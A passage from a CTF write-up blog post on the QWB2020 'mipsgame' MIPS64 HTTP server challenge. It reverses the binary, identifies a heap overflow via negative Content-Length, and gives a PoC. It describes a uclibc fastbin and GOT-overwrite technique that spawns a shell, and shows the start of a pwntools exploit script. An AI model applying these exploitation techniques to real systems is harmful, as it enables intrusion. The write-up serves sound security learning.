<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="相信多年后想起2020的夏天还是会会心一笑 。 似乎永远花不完的夜宵券，腾云三楼铁板烧窗口，每周上新的免费雪糕承担了体重上升的借口， 亲身参与中国队伍首次DEFCON CTF夺冠，见识过顶级选手的神仙操作，多熬了几个通宵也是值得， 没有比赛的周末会和阿良到豫园站旁边的ChaletPlus喝可以续杯的Tequila Sunrise或Sea Breeze。 This is a challenge fr">
<meta property="og:type" content="article">
<meta property="og:title" content="[QWB2020 Quals] - mipsgame">
<meta property="og:url" content="http://matshao.com/2020/09/04/QWB2020-Quals-mipsgame/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="相信多年后想起2020的夏天还是会会心一笑 。 似乎永远花不完的夜宵券，腾云三楼铁板烧窗口，每周上新的免费雪糕承担了体重上升的借口， 亲身参与中国队伍首次DEFCON CTF夺冠，见识过顶级选手的神仙操作，多熬了几个通宵也是值得， 没有比赛的周末会和阿良到豫园站旁边的ChaletPlus喝可以续杯的Tequila Sunrise或Sea Breeze。 This is a challenge fr">
<meta property="og:locale" content="zh-hk">
<meta property="og:image" content="https://i.loli.net/2020/09/05/cWa3XCkYZNrAVe4.png">
<meta property="og:image" content="https://i.loli.net/2020/09/05/wZoiRacbmVDrLUI.png">
<meta property="og:updated_time" content="2020-09-05T08:28:10.205Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[QWB2020 Quals] - mipsgame">
<meta name="twitter:description" content="相信多年后想起2020的夏天还是会会心一笑 。 似乎永远花不完的夜宵券，腾云三楼铁板烧窗口，每周上新的免费雪糕承担了体重上升的借口， 亲身参与中国队伍首次DEFCON CTF夺冠，见识过顶级选手的神仙操作，多熬了几个通宵也是值得， 没有比赛的周末会和阿良到豫园站旁边的ChaletPlus喝可以续杯的Tequila Sunrise或Sea Breeze。 This is a challenge fr">
<meta name="twitter:image" content="https://i.loli.net/2020/09/05/cWa3XCkYZNrAVe4.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2020/09/04/QWB2020-Quals-mipsgame/">





  <title> [QWB2020 Quals] - mipsgame | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  









  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2020/09/04/QWB2020-Quals-mipsgame/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [QWB2020 Quals] - mipsgame
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-04T21:38:07+08:00">
                2020-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>相信多年后想起2020的夏天还是会会心一笑 。<br>
似乎永远花不完的夜宵券，腾云三楼铁板烧窗口，每周上新的免费雪糕承担了体重上升的借口，<br>
亲身参与中国队伍首次DEFCON CTF夺冠，见识过顶级选手的神仙操作，多熬了几个通宵也是值得，<br>
没有比赛的周末会和阿良到豫园站旁边的ChaletPlus喝可以续杯的Tequila Sunrise或Sea Breeze。</p>
<p>This is a challenge from QiangWangBei Quals this year. QiangWangBei is considered to be one of the top CTF game in China.The challenge is a http server in MIPS64, only two solved during the game (from 0ops and eee). I’ve found the vulnerability and constructed a PoC during the game, but didn’t have enough time to build a system-mode emulation environment to finish the expliot. Also, because unfamiliar with uclibc, I didn’t come up with a viable method to hijack the control flow.</p>
<p>After the game finished, I recalled how to build the QEMU debugging environement with buildroot. I shared this knowledge with my colleague @ruan, he wrote a detailed <a href="https://ruan777.github.io/2020/08/25/mips64%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">writeup</a> (in chinese) about the building steps. So in this writeup I’ll focus on the challenge itself. I finished this challenge with some hints from <a href="https://ctftime.org/user/18030" target="_blank" rel="noopener">@Himyth</a>. Thanks @Himyth and @ruan!</p>
<a id="more"></a>
<h2 id="Debug-Environment"><a class="header-anchor" href="#Debug-Environment">¶</a>Debug Environment</h2>
<p>You can download the challenge from <a href="https://github.com/Ma3k4H3d/2020-QWB-PWN/blob/master/game.zip" target="_blank" rel="noopener">here</a>. The challenge designer provides a <code>httpd</code> MIPS64 binary with <code>ld64-uClibc-1.032.so</code> and <code>libuClibc-1.0.32.so</code>. With these binaries, it is easy to launch the program in user-mode emulation. We can copy the library files <code>ld64-uClibc-1.0.32.so</code> -&gt; <code>./lib/ld64-uClibc.so.0</code> and <code>libuClibc-1.0.32.so</code> -&gt; <code>./lib/libc.so.0</code>. Then launch the httpserver with <code>qemu-mips64</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-mips64 -L ./ httpd <span class="comment"># without gdbserver</span></span><br><span class="line">qemu-mips64 -L ./ -g 1234 httpd <span class="comment"># with gdbserver</span></span><br></pre></td></tr></table></figure>
<p>In this way, there is no ASLR and the base addresses of each sections are quite different from the system-mode emulation. For example, in user-mode, libc address will be <code>0x4000xxxxxx</code>, but the correct address will be <code>0xfff7xxxxxx</code> in system-mode. Aftering leaking some addresses from the remote server, we confirmed that the remote service is running in system emulation. Such difference will make it hard to develop a stable exploit against remote service, for example leaking a libc address with <code>puts</code> in user-mode will fail because of the <code>00</code> in the middle of the address, but we don’t have such trouble in system-mode. So it is better to have a system-mode debugging environment.</p>
<h2 id="Reversing-and-Vulnerability"><a class="header-anchor" href="#Reversing-and-Vulnerability">¶</a>Reversing and Vulnerability</h2>
<p>Since our favorite reverse engineering tool IDA pro does not support decompiling mips64 yet. We tried Ghidra and it works surprisingly well. A flaw here is Ghidra could not identify some sections’ base addresses correctly, so it could not process the data references.<br>
<img src="https://i.loli.net/2020/09/05/cWa3XCkYZNrAVe4.png" alt="data references error"><span class="image-caption">data references error</span><br>
The tip here is to fix the memory mapping, you could click the “memory map” button at toolbox, then find “.rodata” section, then click the “move the block to anthor address” button on top right. Now you could change the start address from <code>0x13cc0</code> to <code>0x3cc0</code>, and the data references should be good.<br>
<img src="https://i.loli.net/2020/09/05/wZoiRacbmVDrLUI.png" alt="fixing memory mapping"><span class="image-caption">fixing memory mapping</span><br>
Then we can see the logic of this program clearly. It accepts http request from stdin and print response on stdout. There is a <code>serve_file</code> which can read static files from “htdocs” and return their contents, but it sanitizes “…” token, so we could not escape the directory.<br>
It also has a <code>handle</code> function, which provides a interface like common menu style heap challenge. We can use <code>POST</code> method to create or edit an item.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(idx, len, content)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /index.html HTTP/1.1\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: %d\n"</span> % len</span><br><span class="line">    payload += <span class="string">"Content-Indexx: %d\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>And it provides <code>show</code> and <code>delete</code> functions:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?Show=%d HTTP/1.1\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    payload = <span class="string">"GET /index.html?Del=%d HTTP/1.1\n"</span> % idx</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>It turns out these logic are bug-free. The vulnerability is when dealing with incorrect Content-Length. When processing a POST request, it will get at most 0x400 bytes of request content and try to parse the Content-Length. If the Content-Length value is converted to a negative number, the error value as well as its size will be passed to <code>error_request</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iVar3 = strcasecmp(local_38,<span class="string">"POST"</span>);</span><br><span class="line"><span class="keyword">if</span> (CONCAT44(extraout_v0_hi_05,iVar3) == <span class="number">0</span>) &#123;</span><br><span class="line">  size = get_line(&amp;local_460,<span class="number">0x400</span>);</span><br><span class="line">  <span class="keyword">while</span> ((<span class="number">0</span> &lt; size &amp;&amp;</span><br><span class="line">         (iVar3 = <span class="built_in">strcmp</span>(<span class="string">"\n"</span>,(<span class="keyword">char</span> *)&amp;local_460), CONCAT44(extraout_v0_hi_08,iVar3) != <span class="number">0</span>))) &#123;</span><br><span class="line">    local_458 = local_458 &amp; <span class="number">0xffffffffffffff00</span>;</span><br><span class="line">    iVar3 = strcasecmp((<span class="keyword">char</span> *)&amp;local_460,<span class="string">"Content-Length:"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((CONCAT44(extraout_v0_hi_06,iVar3) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">       (local_474 = atoi((<span class="keyword">char</span> *)&amp;buf), (<span class="keyword">int</span>)local_474 &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">      error_request(&amp;buf,size + <span class="number">-0x11</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>error_request</code> will first copy the error value into global pointer <code>info</code>. But the <code>memset(info, 0, 0x200)</code> suggests that the size of <code>info</code> buffer is only <code>0x200</code> bytes.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_request</span><span class="params">(<span class="keyword">void</span> *param_1,<span class="keyword">size_t</span> param_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *__s;</span><br><span class="line">  <span class="keyword">size_t</span> sVar1;</span><br><span class="line"></span><br><span class="line">  __s = info;</span><br><span class="line">  <span class="built_in">memset</span>(info,<span class="number">0</span>,<span class="number">0x200</span>); <span class="comment">// suggesting info in the size of 0x200</span></span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"HTTP/1.0 400 ERROR REQUEST\r\n"</span>);</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memcpy</span>(__s,param_1,param_2); <span class="comment">// [!Bug!] copy according to the arguments, where param_1 can be at most 0x400 bytes.</span></span><br><span class="line">  <span class="built_in">sprintf</span>(__s,<span class="string">"\r\n"</span>);</span><br><span class="line">  sVar1 = <span class="built_in">strlen</span>(__s);</span><br><span class="line">  write(<span class="number">1</span>,__s,sVar1);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we trace the <code>info</code> pointer and we can see that it was allocated in <code>init</code> function, it was on the heap and in the size of 0x200 bytes.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">(EVP_PKEY_CTX *ctx)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0x3c</span>);</span><br><span class="line">  tmp = <span class="built_in">malloc</span>(<span class="number">0x250</span>);</span><br><span class="line">  info = <span class="built_in">malloc</span>(<span class="number">0x200</span>); <span class="comment">// info was allocated here</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1143b0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now we can construct a PoC like:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error_post</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /index.html HTTP/1.1\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: %s\n"</span> % content</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvrepeat(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">error_post(<span class="number">0</span>, <span class="string">"-1 "</span>+ <span class="string">"A"</span> * <span class="number">0x300</span>) <span class="comment"># heap overflow!</span></span><br></pre></td></tr></table></figure>
<h2 id="Heap-Overflow-and-uclibc"><a class="header-anchor" href="#Heap-Overflow-and-uclibc">¶</a>Heap-Overflow and uclibc</h2>
<p>The problem becomes how to exploit a heap overflow vulnerability in uclibc. In recent version of uclibc, the allocator is based on early version of ptmalloc. So some common heap exploitation techniques in glibc can be applied, and the good news is there are much fewer security hardening measures in uclibc.</p>
<p>The attack plans is first leaking a libc address from the chunk inside unsortedbin, with the heap-overflow and the show function, this is very easy. Then we can perform <code>fastbin attack</code> and get aribitrary write primitive. Using the heap overflow to modify the <code>fd</code> of freed chunk in fastbin is also easy, and we don’t need to care about selecting a fake size, because there is no size check.</p>
<p>The only question here is how to hijack the control flow with this arbitrary write. If you look at the source code of uclibc or open its binary with IDA Pro, there is no such thing like <code>__free_hook</code> or <code>__malloc_hook</code>.</p>
<p>We look at the disassembly of <code>free</code> function, and realize that the calling instruction is perfromed with <code>$gp</code> and <code>$t9</code> registers. <code>$gp</code> is pointing to an address from data section, when calling another libc function, it first load the address with offset to <code>$t9</code> and then <code>jalr $t9</code> to finish the calling operation. For example, when calling <code>__pthread_cleanup_push_defer</code> on line 24, it first loads the target function address with <code>ld $t9, -0x6890($gp)</code> on line 19, and then <code>jalr $t9</code> to call the target function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000005</span>D7B8                 .globl <span class="built_in">free</span>  <span class="meta"># weak</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8 <span class="built_in">free</span>:                                    # CODE XREF: getcwd+<span class="number">124</span>↑p</span><br><span class="line">.text:<span class="number">000000000005</span>D7B8                                          <span class="meta"># closedir+A8↑p ...</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8</span><br><span class="line">.text:<span class="number">000000000005</span>D7B8 var_20          = <span class="number">-0x20</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8 var_18          = <span class="number">-0x18</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8 var_10          = <span class="number">-0x10</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8 var_8           = <span class="number">-8</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7B8</span><br><span class="line">.text:<span class="number">000000000005</span>D7B8                 beqz    $a0, locret_5D9EC</span><br><span class="line">.text:<span class="number">000000000005</span>D7BC                 nop</span><br><span class="line">.text:<span class="number">000000000005</span>D7C0                 daddiu  $sp, <span class="number">-0x40</span></span><br><span class="line">.text:<span class="number">000000000005</span>D7C4                 sd      $gp, <span class="number">0x40</span>+var_10($sp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7C8                 lui     $gp, %hi(off_A8510+<span class="number">0x7FF0</span> - <span class="built_in">free</span>)</span><br><span class="line">.text:<span class="number">000000000005</span>D7CC                 daddu   $gp, $t9</span><br><span class="line">.text:<span class="number">000000000005</span>D7D0                 daddiu  $gp, %lo(off_A8510+<span class="number">0x7FF0</span> - <span class="built_in">free</span>)</span><br><span class="line">.text:<span class="number">000000000005</span>D7D4                 ld      $a2, <span class="number">-0x7300</span>($gp)  # arg</span><br><span class="line">.text:<span class="number">000000000005</span>D7D8                 ld      $a1, <span class="number">-0x6708</span>($gp)  # routine</span><br><span class="line">.text:<span class="number">000000000005</span>D7DC                 ld      $t9, <span class="number">-0x6890</span>($gp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7E0                 sd      $s1, <span class="number">0x40</span>+var_18($sp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7E4                 move    $s1, $a0</span><br><span class="line">.text:<span class="number">000000000005</span>D7E8                 move    $a0, $sp         # buffer</span><br><span class="line">.text:<span class="number">000000000005</span>D7EC                 sd      $ra, <span class="number">0x40</span>+var_8($sp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7F0                 jalr    $t9 ; _pthread_cleanup_push_defer</span><br><span class="line">.text:<span class="number">000000000005</span>D7F4                 sd      $s0, <span class="number">0x40</span>+var_20($sp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7F8                 ld      $t9, <span class="number">-0x7D90</span>($gp)</span><br><span class="line">.text:<span class="number">000000000005</span>D7FC                 jalr    $t9 ; pthread_mutex_lock</span><br></pre></td></tr></table></figure>
<p>We examined the <code>$gp</code> value in gdb, and calculate <code>-0x6890 $(gp)</code>, the address is <code>0xa9c70</code>. This address is located in <code>.got</code>. And it is writable.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">00000000000</span>A9C70 _pthread_cleanup_push_defer_ptr:.dword _pthread_cleanup_push_defer</span><br><span class="line">.got:<span class="number">00000000000</span>A9C78 dlsym_ptr:      .dword dlsym</span><br><span class="line">.got:<span class="number">00000000000</span>A9C80 __syscall_error_ptr:.dword __syscall_error</span><br><span class="line">.got:<span class="number">00000000000</span>A9C88 ttyname_r_ptr_0:.dword ttyname_r</span><br><span class="line">.got:<span class="number">00000000000</span>A9C90 _dl_malloc_ptr: .dword _dl_malloc</span><br><span class="line">.got:<span class="number">00000000000</span>A9C98 _dl_handles_ptr:.dword _dl_handles</span><br><span class="line">.got:<span class="number">00000000000</span>A9CA0 endmntent_ptr_0:.dword endmntent</span><br><span class="line">.got:<span class="number">00000000000</span>A9CA8 setresuid_ptr:  .dword setresuid</span><br></pre></td></tr></table></figure>
<p>We tried to overwrite this address with gdb command: <code>set {unsigned long long} $libc+0xa9c70 = 0xdeadbeef</code>, and request a delete operation, control flow hijacked. So the conclusion is that the libc function calling is finished via some got-like mechanism, we can overwrite the got entry and hijack the control flow.</p>
<p>But hijacking <code>_pthread_cleanup_push_defer</code> could not control the first argument. At last we chose to hijack the <code>munmap</code> function at the end of <code>free</code>, so that we can control the first argument. By modifying <code>munmap</code> to <code>system</code> and setting up chunk content to <code>/bin/sh</code>, we can spawn a shell. Of course, we need to faking the chunksize to fullfill the condition of <code>chunk_is_mmapped</code> and get into the munmmap branch, because <code>IS_MMAPPED</code> is 0x2, so a fake size like <code>0x20002</code> will do the trick.</p>
<h2 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># flag&#123;QWB_Snak3_Gam3_Te11_Y0u_Th3_Secret_0f_MIPS64&#125;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">''</span>&#125;</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line">context.endian = <span class="string">"big"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">'qemu-mips64'</span>, <span class="string">'-L'</span>, <span class="string">'./'</span>, <span class="string">'-g'</span>, <span class="string">'1234'</span>, <span class="string">'httpd'</span>])</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(idx, len, content)</span>:</span></span><br><span class="line">    payload = <span class="string">"POST /index.html HTTP/1.1\n"</span></span><br><span class="line">    payload += <span class="string">"Content-Length: %d\n"</span> % len</span><br><span class="line">    payload += <span 